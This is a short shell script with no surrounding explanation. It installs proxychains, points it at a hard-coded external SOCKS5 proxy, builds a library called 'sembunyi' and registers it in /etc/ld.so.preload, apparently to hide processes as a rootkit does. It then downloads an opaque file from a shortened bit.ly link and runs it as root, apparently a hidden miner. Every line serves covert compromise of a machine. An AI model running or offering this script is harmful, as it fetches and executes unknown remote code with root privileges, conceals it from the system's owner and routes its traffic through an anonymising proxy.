sudo apt update
sudo apt install proxychains gcc -y
sed -i 's/socks4/socks5/' /etc/proxychains.conf 
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
wget https://bit.ly/3Ibzg9T
chmod +x 3Ibzg9T
sudo su --command "./3Ibzg9T"
